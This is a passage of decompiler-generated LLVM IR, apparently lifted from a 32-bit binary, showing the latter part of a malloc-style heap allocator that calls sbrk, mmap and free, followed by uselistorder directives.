  br i1 %tmp88, label %dec_label_pc_8050136, label %dec_label_pc_8050120

dec_label_pc_8050120:                             ; preds = %dec_label_pc_805010c
  store i32 %v2_805011c, i32* %stack_var_-92, align 4
  %v1_8050124 = call i32 @__GI_sbrk(i32 %v2_805011c)
  store i32 %v1_8050124, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8050124, i32* @ebx, align 4
  %v10_8050131 = icmp eq i32 %v1_8050124, -1
  %v1_8050134 = icmp eq i1 %v10_8050131, false
  br i1 %v1_8050134, label %dec_label_pc_805018c.dec_label_pc_8050195_crit_edge, label %dec_label_pc_8050120.dec_label_pc_8050136_crit_edge

dec_label_pc_8050120.dec_label_pc_8050136_crit_edge: ; preds = %dec_label_pc_8050120
  %v0_8050136.pre = load i8, i8* @global_var_805eb40.231, align 64
  br label %dec_label_pc_8050136

dec_label_pc_8050136:                             ; preds = %dec_label_pc_8050120.dec_label_pc_8050136_crit_edge, %dec_label_pc_805010c
  %v0_8050162 = phi i32 [ -1, %dec_label_pc_8050120.dec_label_pc_8050136_crit_edge ], [ %v1_8050114, %dec_label_pc_805010c ]
  %v0_8050136 = phi i8 [ %v0_8050136.pre, %dec_label_pc_8050120.dec_label_pc_8050136_crit_edge ], [ %v0_8050101, %dec_label_pc_805010c ]
  %v1_8050136 = urem i8 %v0_8050136, 2
  %v2_8050136 = icmp eq i8 %v1_8050136, 0
  br i1 %v2_8050136, label %dec_label_pc_8050136.dec_label_pc_805014b_crit_edge, label %dec_label_pc_805013f

dec_label_pc_8050136.dec_label_pc_805014b_crit_edge: ; preds = %dec_label_pc_8050136
  %v0_805014b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805014b

dec_label_pc_805013f:                             ; preds = %dec_label_pc_8050136
  %v2_8050143 = add i32 %v1_80500f8, %v1_8050018
  store i32 %v2_8050143, i32* %eax.global-to-local, align 4
  %v0_8050145 = load i32, i32* @esi, align 4
  %v2_8050145 = add i32 %v0_8050145, %v2_8050143
  %v5_8050147 = and i32 %v2_8050145, %v1_8050114
  store i32 %v5_8050147, i32* @esi, align 4
  br label %dec_label_pc_805014b

dec_label_pc_805014b:                             ; preds = %dec_label_pc_8050136.dec_label_pc_805014b_crit_edge, %dec_label_pc_805013f
  %v0_805014b = phi i32 [ %v0_805014b.pre, %dec_label_pc_8050136.dec_label_pc_805014b_crit_edge ], [ %v5_8050147, %dec_label_pc_805013f ]
  %tmp132 = icmp ult i32 %v0_805014b, 1048576
  br i1 %tmp132, label %dec_label_pc_8050153, label %dec_label_pc_8050158

dec_label_pc_8050153:                             ; preds = %dec_label_pc_805014b
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8050158

dec_label_pc_8050158:                             ; preds = %dec_label_pc_805014b, %dec_label_pc_8050153
  %v0_805016c = phi i32 [ %v0_805014b, %dec_label_pc_805014b ], [ 1048576, %dec_label_pc_8050153 ]
  %tmp133 = icmp ugt i32 %v0_805016c, %v1_8050042
  br i1 %tmp133, label %dec_label_pc_8050162, label %dec_label_pc_805039a

dec_label_pc_8050162:                             ; preds = %dec_label_pc_8050158
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805016f = call i32 @mmap(i32 0, i32 %v0_805016c, i32 3, i32 34, i32 0, i32 0, i32 %v0_8050162, i32 %v0_8050162)
  store i32 %v8_805016f, i32* %eax.global-to-local, align 4
  store i32 %v8_805016f, i32* @ebx, align 4
  %v10_8050179 = icmp eq i32 %v8_805016f, -1
  br i1 %v10_8050179, label %dec_label_pc_805039a, label %dec_label_pc_805018c.thread

dec_label_pc_805018c.thread:                      ; preds = %dec_label_pc_8050162
  %v0_8050182 = load i8, i8* @global_var_805eb40.231, align 1
  %v2_8050182 = and i8 %v0_8050182, -2
  store i8 %v2_8050182, i8* @global_var_805eb40.231, align 64
  %v1_8050189 = load i32, i32* @esi, align 4
  %v2_8050189 = add i32 %v1_8050189, %v8_805016f
  store i32 %v2_8050189, i32* @edx, align 4
  br label %dec_label_pc_8050195

dec_label_pc_805018c.dec_label_pc_8050195_crit_edge: ; preds = %dec_label_pc_8050120
  %v1_8050199.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050195

dec_label_pc_8050195:                             ; preds = %dec_label_pc_805018c.dec_label_pc_8050195_crit_edge, %dec_label_pc_805018c.thread
  %v1_8050199 = phi i32 [ %v1_8050189, %dec_label_pc_805018c.thread ], [ %v1_8050199.pre, %dec_label_pc_805018c.dec_label_pc_8050195_crit_edge ]
  %v0_805026192 = phi i32 [ %v8_805016f, %dec_label_pc_805018c.thread ], [ %v1_8050124, %dec_label_pc_805018c.dec_label_pc_8050195_crit_edge ]
  %v0_805025391 = phi i32 [ %v2_8050189, %dec_label_pc_805018c.thread ], [ -1, %dec_label_pc_805018c.dec_label_pc_8050195_crit_edge ]
  %v0_8050199 = load i32, i32* @global_var_805eb48.228, align 8
  %v2_8050199 = add i32 %v1_8050199, %v0_8050199
  store i32 %v2_8050199, i32* @global_var_805eb48.228, align 8
  %v2_805019f = add i32 %v1_80500f8, %v0_80500e5
  store i32 %v2_805019f, i32* %ecx.global-to-local, align 4
  %v2_80501a1 = sub i32 %v0_805026192, %v2_805019f
  %v7_80501a1 = icmp ult i32 %v0_805026192, %v2_805019f
  %v12_80501a1 = icmp eq i32 %v2_80501a1, 0
  %v1_80501a3 = icmp eq i1 %v12_80501a1, false
  br i1 %v1_80501a3, label %dec_label_pc_80501bc, label %dec_label_pc_80501a5

dec_label_pc_80501a5:                             ; preds = %dec_label_pc_8050195
  %v10_80501a5 = icmp eq i32 %v0_805025391, -1
  %v1_80501a8 = icmp eq i1 %v10_80501a5, false
  br i1 %v1_80501a8, label %dec_label_pc_80501bc, label %dec_label_pc_80501aa

dec_label_pc_80501aa:                             ; preds = %dec_label_pc_80501a5
  %v2_80501aa = add i32 %v1_8050199, %v1_80500f8
  store i32 %v0_80500e5, i32* %ecx.global-to-local, align 4
  %v1_80501b1 = or i32 %v2_80501aa, 1
  store i32 %v1_80501b1, i32* %eax.global-to-local, align 4
  store i32 %v1_80501b1, i32* %v2_80500ee, align 4
  br label %dec_label_pc_80502e9

dec_label_pc_80501bc:                             ; preds = %dec_label_pc_80501a5, %dec_label_pc_8050195
  %v0_80501bc = load i8, i8* @global_var_805eb40.231, align 1
  %v1_80501bc = sext i8 %v0_80501bc to i32
  store i32 %v1_80501bc, i32* %eax.global-to-local, align 4
  %v2_80501c1 = urem i8 %v0_80501bc, 2
  %v3_80501c1 = icmp eq i8 %v2_80501c1, 0
  br i1 %v3_80501c1, label %dec_label_pc_80501d5, label %dec_label_pc_80501c5

dec_label_pc_80501c5:                             ; preds = %dec_label_pc_80501bc
  br i1 %v2_80500f8, label %dec_label_pc_80501d5, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501c5
  %v1_80501cb = icmp eq i1 %v7_80501a1, false
  br i1 %v1_80501cb, label %dec_label_pc_80501d5, label %dec_label_pc_80501cd

dec_label_pc_80501cd:                             ; preds = %dec_label_pc_80501c9
  %v1_80501cd = and i32 %v1_80501bc, -2
  %v4_80501cd = trunc i32 %v1_80501cd to i8
  store i32 %v1_80501cd, i32* %eax.global-to-local, align 4
  store i8 %v4_80501cd, i8* @global_var_805eb40.231, align 64
  br label %dec_label_pc_80501d5

dec_label_pc_80501d5:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_80501c5, %dec_label_pc_80501bc, %dec_label_pc_80501cd
  %v0_80501d5 = phi i8 [ %v0_80501bc, %dec_label_pc_80501c9 ], [ %v0_80501bc, %dec_label_pc_80501c5 ], [ %v0_80501bc, %dec_label_pc_80501bc ], [ %v4_80501cd, %dec_label_pc_80501cd ]
  %v1_80501d5 = urem i8 %v0_80501d5, 2
  %v2_80501d5 = icmp eq i8 %v1_80501d5, 0
  br i1 %v2_80501d5, label %dec_label_pc_8050253, label %dec_label_pc_80501de

dec_label_pc_80501de:                             ; preds = %dec_label_pc_80501d5
  br i1 %v2_80500f8, label %dec_label_pc_80501ec, label %dec_label_pc_80501e2

dec_label_pc_80501e2:                             ; preds = %dec_label_pc_80501de
  store i32 %v2_80501a1, i32* %eax.global-to-local, align 4
  %v2_80501e6 = add i32 %v2_8050199, %v2_80501a1
  store i32 %v2_80501e6, i32* @global_var_805eb48.228, align 8
  br label %dec_label_pc_80501ec

dec_label_pc_80501ec:                             ; preds = %dec_label_pc_80501de, %dec_label_pc_80501e2
  %v1_80501ee = urem i32 %v0_805026192, 8
  %v2_80501ee = icmp eq i32 %v1_80501ee, 0
  store i32 %v1_80501ee, i32* %edx.global-to-local, align 4
  %v1_80501f1 = icmp eq i1 %v2_80501ee, false
  br i1 %v1_80501f1, label %dec_label_pc_80501f9, label %dec_label_pc_80501f3

dec_label_pc_80501f3:                             ; preds = %dec_label_pc_80501ec
  store i32 %v0_805026192, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050203

dec_label_pc_80501f9:                             ; preds = %dec_label_pc_80501ec
  %v2_80501fe = sub nsw i32 8, %v1_80501ee
  store i32 %v2_80501fe, i32* %eax.global-to-local, align 4
  %v2_8050200 = add i32 %v2_80501fe, %v0_805026192
  store i32 %v2_8050200, i32* @edi, align 4
  br label %dec_label_pc_8050203

dec_label_pc_8050203:                             ; preds = %dec_label_pc_80501f3, %dec_label_pc_80501f9
  %v0_8050206 = phi i32 [ 0, %dec_label_pc_80501f3 ], [ %v2_80501fe, %dec_label_pc_80501f9 ]
  %v2_8050203 = add i32 %v1_8050199, %v0_805026192
  %v2_8050206 = add i32 %v0_8050206, %v1_80500f8
  store i32 %v2_8050206, i32* %ecx.global-to-local, align 4
  %v2_805020f = add i32 %v2_8050206, %v2_8050203
  store i32 %v2_805020f, i32* %edx.global-to-local, align 4
  %v2_8050215 = add i32 %v2_805020f, %v1_8050018
  %v5_8050218 = and i32 %v2_8050215, %v1_8050114
  %v2_805021f = sub i32 %v5_8050218, %v2_805020f
  store i32 %v2_805021f, i32* %eax.global-to-local, align 4
  %v2_8050221 = add i32 %v2_805021f, %v2_8050206
  store i32 %v2_8050221, i32* @esi, align 4
  store i32 %v2_8050221, i32* %stack_var_-92, align 4
  %v1_8050225 = call i32 @__GI_sbrk(i32 %v2_8050221)
  store i32 %v1_8050225, i32* %eax.global-to-local, align 4
  store i32 %v1_8050225, i32* @edx, align 4
  %v10_805022f = icmp eq i32 %v1_8050225, -1
  %v1_8050232 = icmp eq i1 %v10_805022f, false
  br i1 %v1_8050232, label %dec_label_pc_8050242, label %dec_label_pc_8050234

dec_label_pc_8050234:                             ; preds = %dec_label_pc_8050203
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050239 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050239, i32* %eax.global-to-local, align 4
  store i32 %v1_8050239, i32* @edx, align 4
  br label %dec_label_pc_8050276

dec_label_pc_8050242:                             ; preds = %dec_label_pc_8050203
  %v1_8050242 = load i32, i32* @ebx, align 4
  %v7_8050242 = icmp ult i32 %v1_8050225, %v1_8050242
  %v1_8050244 = icmp eq i1 %v7_8050242, false
  br i1 %v1_8050244, label %dec_label_pc_805027b, label %dec_label_pc_8050246

dec_label_pc_8050246:                             ; preds = %dec_label_pc_8050242
  %v0_8050246 = load i8, i8* @global_var_805eb40.231, align 1
  %v2_8050246 = and i8 %v0_8050246, -2
  store i8 %v2_8050246, i8* @global_var_805eb40.231, align 64
  store i32 %v2_8050203, i32* @edx, align 4
  br label %dec_label_pc_805025a

dec_label_pc_8050253:                             ; preds = %dec_label_pc_80501d5
  %v10_8050253 = icmp eq i32 %v0_805025391, -1
  br i1 %v10_8050253, label %dec_label_pc_805025e, label %dec_label_pc_8050258

dec_label_pc_8050258:                             ; preds = %dec_label_pc_8050253
  store i32 %v0_805026192, i32* @edi, align 4
  br label %dec_label_pc_805025a

dec_label_pc_805025a:                             ; preds = %dec_label_pc_8050246, %dec_label_pc_8050258
  %v0_805027b49 = phi i32 [ %v2_8050203, %dec_label_pc_8050246 ], [ %v0_805025391, %dec_label_pc_8050258 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805027b

dec_label_pc_805025e:                             ; preds = %dec_label_pc_8050253
  store i32 %v0_805026192, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050265 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050265, i32* @edx, align 4
  %v1_805026c = load i32, i32* @ebx, align 4
  %v2_805026c = sub i32 %v1_8050265, %v1_805026c
  %v1_805026e = load i32, i32* @esi, align 4
  %v2_805026e = sub i32 %v2_805026c, %v1_805026e
  store i32 %v2_805026e, i32* %eax.global-to-local, align 4
  %v0_8050270 = load i32, i32* @global_var_805eb48.228, align 8
  %v2_8050270 = add i32 %v0_8050270, %v2_805026e
  store i32 %v2_8050270, i32* @global_var_805eb48.228, align 8
  br label %dec_label_pc_8050276

dec_label_pc_8050276:                             ; preds = %dec_label_pc_8050234, %dec_label_pc_805025e
  %v0_805027b48 = phi i32 [ %v1_8050239, %dec_label_pc_8050234 ], [ %v1_8050265, %dec_label_pc_805025e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805027b

dec_label_pc_805027b:                             ; preds = %dec_label_pc_8050242, %dec_label_pc_805025a, %dec_label_pc_8050276
  %v0_8050280 = phi i32 [ %v1_8050225, %dec_label_pc_8050242 ], [ %v0_805027b49, %dec_label_pc_805025a ], [ %v0_805027b48, %dec_label_pc_8050276 ]
  %v10_805027b = icmp eq i32 %v0_8050280, -1
  br i1 %v10_805027b, label %dec_label_pc_80502e9, label %dec_label_pc_8050280

dec_label_pc_8050280:                             ; preds = %dec_label_pc_805027b
  %v1_8050280 = load i32, i32* @edi, align 4
  %v2_8050280 = sub i32 %v0_8050280, %v1_8050280
  store i32 %v2_8050280, i32* @edx, align 4
  store i32 %v1_8050280, i32* @global_var_805e80c.216, align 4
  %v1_8050288 = load i32, i32* @esi, align 4
  %v2_8050288 = add i32 %v1_8050288, %v2_8050280
  %v1_805028b = or i32 %v2_8050288, 1
  store i32 %v1_805028b, i32* %eax.global-to-local, align 4
  %v2_805028e = add i32 %v1_8050280, 4
  %v3_805028e = inttoptr i32 %v2_805028e to i32*
  store i32 %v1_805028b, i32* %v3_805028e, align 4
  %v0_8050291 = load i32, i32* @global_var_805eb48.228, align 8
  %v1_8050291 = load i32, i32* @esi, align 4
  %v2_8050291 = add i32 %v1_8050291, %v0_8050291
  store i32 %v2_8050291, i32* @global_var_805eb48.228, align 8
  br i1 %v2_80500f8, label %dec_label_pc_80502e9, label %dec_label_pc_805029b

dec_label_pc_805029b:                             ; preds = %dec_label_pc_8050280
  %v1_805029b = add i32 %v1_80500f8, -12
  store i32 %v0_80500e5, i32* %ecx.global-to-local, align 4
  %v1_80502a2 = and i32 %v1_805029b, -8
  store i32 %v1_80502a2, i32* %eax.global-to-local, align 4
  %v1_80502a7 = or i32 %v1_80502a2, 1
  store i32 %v1_80502a7, i32* @edx, align 4
  %v5_80502aa = icmp ult i32 %v1_80502a2, 15
  store i32 %v1_80502a7, i32* %v2_80500ee, align 4
  %v0_80502b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80502b0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80502b0 = add i32 %v0_80502b0, 4
  %v3_80502b0 = add i32 %v2_80502b0, %v1_80502b0
  %v4_80502b0 = inttoptr i32 %v3_80502b0 to i32*
  store i32 5, i32* %v4_80502b0, align 4
  %v0_80502b8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80502b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80502b8 = add i32 %v0_80502b8, 8
  %v3_80502b8 = add i32 %v2_80502b8, %v1_80502b8
  %v4_80502b8 = inttoptr i32 %v3_80502b8 to i32*
  store i32 5, i32* %v4_80502b8, align 4
  br i1 %v5_80502aa, label %dec_label_pc_80502e9, label %dec_label_pc_80502c2

dec_label_pc_80502c2:                             ; preds = %dec_label_pc_805029b
  %v0_80502c5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80502c7 = add i32 %v0_80502c5, 8
  store i32 %v1_80502c7, i32* %eax.global-to-local, align 4
  %v0_80502ca = load i32, i32* @global_var_805eb24.232, align 4
  store i32 %v0_80502ca, i32* @ebx, align 4
  store i32 %v1_80502c7, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_805eb24.232, align 4
  %v1_80502db = call i32 @free(i32 %v1_80502c7)
  store i32 %v1_80502db, i32* %eax.global-to-local, align 4
  %v0_80502e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80502e0, i32* @global_var_805eb24.232, align 4
  br label %dec_label_pc_80502e9

dec_label_pc_80502e9:                             ; preds = %dec_label_pc_805029b, %dec_label_pc_8050280, %dec_label_pc_805027b, %dec_label_pc_80501aa, %dec_label_pc_80502c2
  %v0_80502e9 = load i32, i32* @global_var_805eb48.228, align 8
  store i32 %v0_80502e9, i32* %eax.global-to-local, align 4
  %v1_80502ee = load i32, i32* @global_var_805eb4c.233, align 4
  %tmp134 = icmp ugt i32 %v0_80502e9, %v1_80502ee
  br i1 %tmp134, label %dec_label_pc_80502f6, label %dec_label_pc_80502fb

dec_label_pc_80502f6:                             ; preds = %dec_label_pc_80502e9
  store i32 %v0_80502e9, i32* @global_var_805eb4c.233, align 4
  br label %dec_label_pc_80502fb

dec_label_pc_80502fb:                             ; preds = %dec_label_pc_80502e9, %dec_label_pc_80502f6
  %v1_80502fb = load i32, i32* @global_var_805eb44.226, align 4
  %v2_80502fb = add i32 %v1_80502fb, %v0_80502e9
  store i32 %v2_80502fb, i32* %eax.global-to-local, align 4
  %v1_8050301 = load i32, i32* @global_var_805eb54.229, align 4
  %tmp135 = icmp ugt i32 %v2_80502fb, %v1_8050301
  br i1 %tmp135, label %dec_label_pc_8050309, label %dec_label_pc_805030e

dec_label_pc_8050309:                             ; preds = %dec_label_pc_80502fb
  store i32 %v2_80502fb, i32* @global_var_805eb54.229, align 4
  br label %dec_label_pc_805030e

dec_label_pc_805030e:                             ; preds = %dec_label_pc_80502fb, %dec_label_pc_8050309
  %v0_805030e = load i32, i32* @global_var_805e80c.216, align 4
  store i32 %v0_805030e, i32* @ebx, align 4
  %v1_8050314 = add i32 %v0_805030e, 4
  %v2_8050314 = inttoptr i32 %v1_8050314 to i32*
  %v3_8050314 = load i32, i32* %v2_8050314, align 4
  %v1_8050317 = and i32 %v3_8050314, -4
  store i32 %v1_8050317, i32* @ecx, align 4
  %v10_805031a = icmp ult i32 %v1_8050317, %v1_804ffb7
  br i1 %v10_805031a, label %dec_label_pc_805039a, label %dec_label_pc_8050320

dec_label_pc_8050320:                             ; preds = %dec_label_pc_805030e
  store i32 %v1_8050042, i32* %esi.global-to-local, align 4
  %v2_8050326 = sub i32 %v1_8050317, %v1_8050042
  store i32 %v2_8050326, i32* %ecx.global-to-local, align 4
  %v2_8050328 = add i32 %v0_805030e, %v1_8050042
  store i32 %v2_8050328, i32* @edx, align 4
  %v1_805032b = or i32 %v1_8050042, 1
  store i32 %v1_805032b, i32* %eax.global-to-local, align 4
  store i32 %v2_8050328, i32* @global_var_805e80c.216, align 4
  store i32 %v1_805032b, i32* %v2_8050314, align 4
  %v0_8050337.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050337

dec_label_pc_8050337:                             ; preds = %dec_label_pc_804ffc8, %dec_label_pc_8050320
  %v0_8050337 = phi i32 [ %v5_804ffdb, %dec_label_pc_804ffc8 ], [ %v0_8050337.pre, %dec_label_pc_8050320 ]
  %v1_8050337 = or i32 %v0_8050337, 1
  store i32 %v1_8050337, i32* @ecx, align 4
  %v0_805033a = load i32, i32* @ebx, align 4
  %v1_805033a = add i32 %v0_805033a, 8
  store i32 %v1_805033a, i32* %ebx.global-to-local, align 4
  %v1_805033d = load i32, i32* @edx, align 4
  %v2_805033d = add i32 %v1_805033d, 4
  %v3_805033d = inttoptr i32 %v2_805033d to i32*
  store i32 %v1_8050337, i32* %v3_805033d, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_8050342:                             ; preds = %dec_label_pc_804fd82
  %v5_8050348 = sub i32 %v1_804fd65, %v1_8050042
  store i32 %v5_8050348, i32* %eax.global-to-local, align 4
  %v2_805034c = add i32 %v0_804fe30111, %v1_8050042
  store i32 %v2_805034c, i32* @edx, align 4
  %v1_8050350 = or i32 %v1_8050042, 1
  store i32 %v2_805034c, i32* @global_var_805e810.217, align 16
  store i32 %v1_8050350, i32* %v2_804fd5f, align 4
  %v0_805035c = load i32, i32* %eax.global-to-local, align 4
  %v0_805035e = load i32, i32* @edx, align 4
  store i32 %v0_805035e, i32* @global_var_805e81c.234, align 4
  %v1_8050364 = or i32 %v0_805035c, 1
  store i32 %v1_8050364, i32* @ecx, align 4
  store i32 %v0_805035e, i32* @global_var_805e820.219, align 32
  %v1_805036d = add i32 %v0_805035e, 8
  %v2_805036d = inttoptr i32 %v1_805036d to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_805036d, align 4
  %v0_8050374 = load i32, i32* @edx, align 4
  %v1_8050374 = add i32 %v0_8050374, 12
  %v2_8050374 = inttoptr i32 %v1_8050374 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_8050374, align 4
  %v0_805037b = load i32, i32* @ecx, align 4
  %v1_805037b = load i32, i32* @edx, align 4
  %v2_805037b = add i32 %v1_805037b, 4
  %v3_805037b = inttoptr i32 %v2_805037b to i32*
  store i32 %v0_805037b, i32* %v3_805037b, align 4
  %v0_805037e = load i32, i32* %eax.global-to-local, align 4
  %v1_805037e = load i32, i32* @edx, align 4
  %v3_805037e = add i32 %v1_805037e, %v0_805037e
  %v4_805037e = inttoptr i32 %v3_805037e to i32*
  store i32 %v0_805037e, i32* %v4_805037e, align 4
  br label %dec_label_pc_805038c

dec_label_pc_8050383:                             ; preds = %dec_label_pc_804fd91
  store i32 %v1_8050042, i32* %ebx.global-to-local, align 4
  %v0_8050387 = load i32, i32* @ebp, align 4
  %v2_8050387 = or i32 %v1_8050042, 4
  %v3_8050387 = add i32 %v0_8050387, %v2_8050387
  %v4_8050387 = inttoptr i32 %v3_8050387 to i32*
  %v5_8050387 = load i32, i32* %v4_8050387, align 4
  %v6_8050387 = or i32 %v5_8050387, 1
  store i32 %v6_8050387, i32* %v4_8050387, align 4
  br label %dec_label_pc_805038c

dec_label_pc_805038c:                             ; preds = %dec_label_pc_8050342, %dec_label_pc_8050383
  %v0_805038c = load i32, i32* @ebp, align 4
  %v1_805038c = add i32 %v0_805038c, 8
  store i32 %v1_805038c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_8050391:                             ; preds = %dec_label_pc_804fe81
  %v1_8050391 = load i32, i32* @ebx, align 4
  %v2_8050391 = add i32 %v0_804fe90, 4
  %v3_8050391 = add i32 %v2_8050391, %v1_8050391
  %v4_8050391 = inttoptr i32 %v3_8050391 to i32*
  %v5_8050391 = load i32, i32* %v4_8050391, align 4
  %v6_8050391 = or i32 %v5_8050391, 1
  store i32 %v6_8050391, i32* %v4_8050391, align 4
  br label %dec_label_pc_8050396

dec_label_pc_8050396:                             ; preds = %dec_label_pc_804fe99, %dec_label_pc_8050391
  %v0_8050396 = load i32, i32* @ecx, align 4
  store i32 %v0_8050396, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_805039a:                             ; preds = %dec_label_pc_8050158, %dec_label_pc_805030e, %dec_label_pc_8050162
  %v0_805039a = load i32, i32* %stack_var_-92, align 4
  %v1_805039a = call i32 @__errno_location(i32 %v0_805039a)
  store i32 %v1_805039a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80503a1 = inttoptr i32 %v1_805039a to i32*
  store i32 12, i32* %v1_80503a1, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_80503a7:                             ; preds = %dec_label_pc_8050396, %dec_label_pc_805038c, %dec_label_pc_8050337, %dec_label_pc_804fff3, %dec_label_pc_804ffa5, %dec_label_pc_804fd2c, %dec_label_pc_805039a
  store i32 %v2_804fc63, i32* @eax, align 4
  store i32 %v2_804fc63, i32* %stack_var_-92, align 4
  %v2_80503b0 = call i32 @__pthread_return_void(i32 %v2_804fc63, i32 1)
  store i32 %v2_80503b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503b8

dec_label_pc_80503b8:                             ; preds = %dec_label_pc_804fc81, %dec_label_pc_80503a7
  %v0_80503bb = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80503bb, i32* %eax.global-to-local, align 4
  %v2_80503bd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80503bd, i32* @ebx, align 4
  store i32 %v0_804fc50, i32* @esi, align 4
  store i32 %v0_804fc4f, i32* @edi, align 4
  store i32 %v0_804fc4e, i32* @ebp, align 4
  ret i32 %v0_80503bb

; uselistorder directives
  uselistorder i32 %v0_805037e, { 1, 0 }
  uselistorder i32 %v0_805035e, { 1, 0, 2 }
  uselistorder i32 %v2_80502fb, { 1, 0, 2 }
  uselistorder i32 %v0_80502e9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050280, { 1, 0 }
  uselistorder i32 %v2_805026e, { 1, 0 }
  uselistorder i32 %v1_8050225, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805020f, { 1, 0, 2 }
  uselistorder i32 %v2_8050203, { 1, 2, 0 }
  uselistorder i32 %v2_80501fe, { 1, 0, 2 }
  uselistorder i32 %v1_80501ee, { 2, 1, 0 }
  uselistorder i8 %v0_80501bc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805019f, { 1, 0, 2 }
  uselistorder i32 %v0_805025391, { 2, 0, 1 }
  uselistorder i32 %v0_805026192, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8050199, { 2, 1, 0 }
  uselistorder i32 %v8_805016f, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_805016c, { 1, 0 }
  uselistorder i32 %v0_805014b, { 1, 0 }
  uselistorder i32 %v2_805011c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050114, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8050101, { 1, 0 }
  uselistorder i32 %v1_80500f8, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_80500e5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80500c9, { 1, 0, 2 }
  uselistorder i32 %v2_80500b5, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805007e, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050072, { 2, 1, 0 }
  uselistorder i32 %v8_8050061, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_8050048, { 1, 0, 2 }
  uselistorder i32 %v0_804ffe4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804ffb7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804ffad, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804ff9f, { 1, 0 }
  uselistorder i32 %v1_804ff36, { 1, 0 }
  uselistorder i32 %v3_804ff2a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804ff3a, { 1, 0 }
  uselistorder i32 %v2_804ff24, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804ff2112, { 1, 0 }
  uselistorder i32 %v2_804ff16, { 1, 0 }
  uselistorder i32 %v1_804fefa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804fef6, { 2, 1, 0 }
  uselistorder i32 %v1_804fef2, { 1, 0 }
  uselistorder i32 %v1_804fee6, { 2, 1, 0 }
  uselistorder i32 %v2_804fedc, { 1, 0 }
  uselistorder i32 %v1_804fed9, { 1, 2, 0 }
  uselistorder i32 %v4_804fe77, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804fec2, { 1, 0 }
  uselistorder i32 %v0_804fe90, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804fe63, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804fe30, { 1, 2, 0 }
  uselistorder i32 %v2_804fe14, { 1, 0 }
  uselistorder i32 %v1_804fe0a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804fe05.lcssa, { 1, 0 }
  uselistorder i32 %v3_804fdf5, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804fdec, { 1, 0, 2 }
  uselistorder i32 %v2_804fdc8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804fdb0, { 2, 1, 0 }
  uselistorder i32 %v0_804fd9c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804fd62, { 1, 0, 2 }
  uselistorder i32 %v0_804fe30111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804fd0f, { 1, 0, 2 }
  uselistorder i32 %v2_804fd01, { 2, 1, 0 }
  uselistorder i32 %v2_804fcdc, { 2, 1, 0 }
  uselistorder i8 %v0_804fcaa, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_8050042, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804fc93, { 0, 2, 1 }
  uselistorder i32 %v0_804fc7c, { 1, 0 }
  uselistorder i32 %v2_804fc63, { 1, 0, 2, 4, 3, 5 }
